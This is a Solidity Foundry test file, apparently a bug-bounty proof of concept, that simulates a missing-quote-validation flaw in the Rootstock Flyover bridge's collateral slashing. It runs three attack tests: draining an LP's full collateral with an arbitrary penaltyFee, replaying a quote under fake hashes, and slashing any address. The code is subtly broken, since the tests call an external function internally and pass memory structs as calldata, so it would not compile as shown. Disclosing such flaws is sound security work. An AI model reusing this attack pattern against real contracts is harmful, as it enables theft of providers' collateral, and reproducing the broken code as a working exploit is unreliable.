// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";

/**
 * @title RootstockSlashingAttack
 * @notice PoC demonstrating Missing Quote Validation in RootstockLabs Flyover Bridge
 *
 * VULNERABILITY: The `slashPegInCollateral` and `slashPegOutCollateral` functions
 * in the Collateral Management Contract accept arbitrary `quote.penaltyFee` values
 * and do NOT verify:
 * 1. That `quoteHash` matches the provided `quote`
 * 2. That the quote was actually signed/created by a liquidity provider
 * 3. That the quote is valid (not expired, proper nonce)
 * 4. That the same quote hasn't been used for multiple slashing events
 *
 * ATTACK SCENARIO:
 * A malicious COLLATERAL_SLASHER (or a compromised slasher) can:
 * - Pass any `quote.penaltyFee` value (up to the LP's full collateral)
 * - Slash any LP by specifying their address in `quote.liquidityProviderRskAddress`
 * - Repeat the same attack with different `quoteHash` values to drain collateral
 *
 * IMPACT: Loss of LP collateral funds through arbitrary slashing
 * SEVERITY: Medium (requires compromised slasher role)
 * 
 * RootstockLabs Bug Bounty: https://immunefi.com/bug-bounty/rootstocklabs
 */
contract RootstockSlashingAttack is Test {

    // Simulated state variables (matching CollateralManagement contract)
    mapping(address => uint256) internal _pegInCollateral;
    mapping(address => uint256) internal _pegOutCollateral;
    mapping(address => uint256) internal _rewards;
    mapping(address => uint256) internal _resignationBlockNum;
    uint256 internal _penalties;
    uint256 internal _rewardPercentage;
    uint256 internal _minCollateral;

    uint256 internal constant TOTAL_REWARD_PERCENTAGE = 10000;

    // Actors
    address internal victimLP = address(0xBEEF);
    address internal attackerSlasher = address(0xDEAD);
    address internal randomAddress = address(0xCAFE);

    // Simulated PegInQuote struct
    struct PegInQuote {
        uint256 chainId;
        uint256 callFee;
        uint256 penaltyFee;
        uint256 value;
        uint256 gasFee;
        bytes20 fedBtcAddress;
        address lbcAddress;
        address liquidityProviderRskAddress;
        address contractAddress;
        address payable rskRefundAddress;
        int64 nonce;
        uint32 gasLimit;
        uint32 agreementTimestamp;
        uint32 timeForDeposit;
        uint32 callTime;
        uint16 depositConfirmations;
        bool callOnRegister;
        bytes btcRefundAddress;
        bytes liquidityProviderBtcAddress;
        bytes data;
    }

    function setUp() public {
        // Setup: Victim LP has 100 ETH of collateral
        _pegInCollateral[victimLP] = 100 ether;
        _rewardPercentage = 500; // 5%
        _minCollateral = 1 ether;

        console.log("=== RootstockLabs Flyover Bridge — Slashing Attack PoC ===");
        console.log("Victim LP:", victimLP);
        console.log("Attacker Slasher:", attackerSlasher);
        console.log("Victim Collateral:", _pegInCollateral[victimLP] / 1e18, "ETH");
    }

    /**
     * @notice Simulates the vulnerable slashPegInCollateral function
     * This mirrors the exact logic from CollateralManagementContract.sol
     */
    function slashPegInCollateral(
        address punisher,
        PegInQuote calldata quote,
        bytes32 quoteHash
    ) external {
        // BUG: No validation that quoteHash matches quote
        // BUG: No validation that quote was actually created by LP
        // BUG: No validation that quote is valid (not expired)
        // BUG: No nonce/anti-replay check on quoteHash

        uint256 penalty = min(
            quote.penaltyFee,
            _pegInCollateral[quote.liquidityProviderRskAddress]
        );
        _pegInCollateral[quote.liquidityProviderRskAddress] -= penalty;
        uint256 punisherReward = (penalty * _rewardPercentage) / TOTAL_REWARD_PERCENTAGE;
        _penalties += penalty - punisherReward;
        _rewards[punisher] += punisherReward;

        console.log("SLASHED:", quote.liquidityProviderRskAddress);
        console.log("  Penalty:", penalty / 1e18, "ETH");
        console.log("  Punisher reward:", punisherReward / 1e18, "ETH");
        console.log("  Remaining collateral:", _pegInCollateral[quote.liquidityProviderRskAddress] / 1e18, "ETH");
    }

    /**
     * @notice Attack: Attacker uses arbitrary penaltyFee to slash victim LP
     */
    function test_attack_arbitrary_slashing() public {
        console.log("\n--- Attack 1: Arbitrary penaltyFee ---");

        // Attacker crafts a malicious quote with arbitrary penaltyFee
        PegInQuote memory maliciousQuote = PegInQuote({
            chainId: 30, // RSK mainnet
            callFee: 0,
            penaltyFee: 100 ether, // FULL collateral — arbitrary!
            value: 0,
            gasFee: 0,
            fedBtcAddress: bytes20(0),
            lbcAddress: address(0),
            liquidityProviderRskAddress: victimLP, // Target victim
            contractAddress: address(0),
            rskRefundAddress: payable(address(0)),
            nonce: 0,
            gasLimit: 0,
            agreementTimestamp: 0,
            timeForDeposit: 0,
            callTime: 0,
            depositConfirmations: 0,
            callOnRegister: false,
            btcRefundAddress: "",
            liquidityProviderBtcAddress: "",
            data: ""
        });

        // Fake quoteHash — no validation against quote content!
        bytes32 fakeQuoteHash = keccak256(abi.encodePacked("completely fake"));

        // Execute slashing — ALL collateral is taken
        slashPegInCollateral(attackerSlasher, maliciousQuote, fakeQuoteHash);

        // Verify: Victim lost all collateral
        assertEq(_pegInCollateral[victimLP], 0, "Victim collateral should be 0");
        assertEq(_rewards[attackerSlasher], 5 ether, "Attacker should have 5% reward");

        console.log("\n✅ Attack successful! Victim lost 100 ETH collateral.");
    }

    /**
     * @notice Attack: Replay the same quote with different quoteHash to slash again
     * (But victim has no collateral left — demonstrates repeated exploitation)
     */
    function test_attack_replay_slashing() public {
        console.log("\n--- Attack 2: Replay with different quoteHash ---");

        // First slash — takes 50 ETH
        PegInQuote memory quote1 = PegInQuote({
            chainId: 30, callFee: 0,
            penaltyFee: 50 ether, // Half the collateral
            value: 0, gasFee: 0,
            fedBtcAddress: bytes20(0), lbcAddress: address(0),
            liquidityProviderRskAddress: victimLP,
            contractAddress: address(0),
            rskRefundAddress: payable(address(0)),
            nonce: 0, gasLimit: 0,
            agreementTimestamp: 0, timeForDeposit: 0, callTime: 0,
            depositConfirmations: 0, callOnRegister: false,
            btcRefundAddress: "", liquidityProviderBtcAddress: "", data: ""
        });

        bytes32 hash1 = keccak256(abi.encodePacked("quote-1"));
        slashPegInCollateral(attackerSlasher, quote1, hash1);

        // Second slash — takes remaining 50 ETH with DIFFERENT quoteHash
        // Same quote, different hash — NO validation prevents this!
        PegInQuote memory quote2 = quote1; // Same quote!
        bytes32 hash2 = keccak256(abi.encodePacked("quote-2")); // Different hash
        slashPegInCollateral(attackerSlasher, quote2, hash2);

        assertEq(_pegInCollateral[victimLP], 0, "Victim collateral should be 0 after replay");
        console.log("\n✅ Replay attack successful! Same quote slashed twice.");
    }

    /**
     * @notice Attack: Slash a completely unrelated address (any address)
     */
    function test_attack_slash_anyone() public {
        console.log("\n--- Attack 3: Slash arbitrary address ---");

        // Give randomAddress some collateral
        _pegInCollateral[randomAddress] = 50 ether;

        PegInQuote memory quote = PegInQuote({
            chainId: 30, callFee: 0,
            penaltyFee: 50 ether,
            value: 0, gasFee: 0,
            fedBtcAddress: bytes20(0), lbcAddress: address(0),
            liquidityProviderRskAddress: randomAddress, // Any address!
            contractAddress: address(0),
            rskRefundAddress: payable(address(0)),
            nonce: 0, gasLimit: 0,
            agreementTimestamp: 0, timeForDeposit: 0, callTime: 0,
            depositConfirmations: 0, callOnRegister: false,
            btcRefundAddress: "", liquidityProviderBtcAddress: "", data: ""
        });

        bytes32 fakeHash = keccak256(abi.encodePacked("random"));
        slashPegInCollateral(attackerSlasher, quote, fakeHash);

        assertEq(_pegInCollateral[randomAddress], 0);
        console.log("\n✅ Arbitrary address slashed! Any LP can be targeted.");
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
